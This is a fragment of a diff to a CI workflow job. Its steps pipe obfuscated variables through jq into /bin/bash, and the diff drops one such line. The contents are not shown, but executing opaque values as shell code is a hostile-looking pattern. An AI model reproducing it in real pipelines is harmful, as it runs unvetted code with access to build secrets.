@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$a05" | jq -r .nup41 | /bin/bash
           echo $il43 | jq -r .xpulq7533 | /bin/bash
-          printf '%s' "$n22" | jq -r .ohmmf96576 | /bin/bash
           printf '%s' "$jtuc1" | jq -r .eck3 | /bin/bash
           echo $fredm4 | jq -r .a7790 | /bin/bash
           echo $t75 | jq -r .a0 | /bin/bash
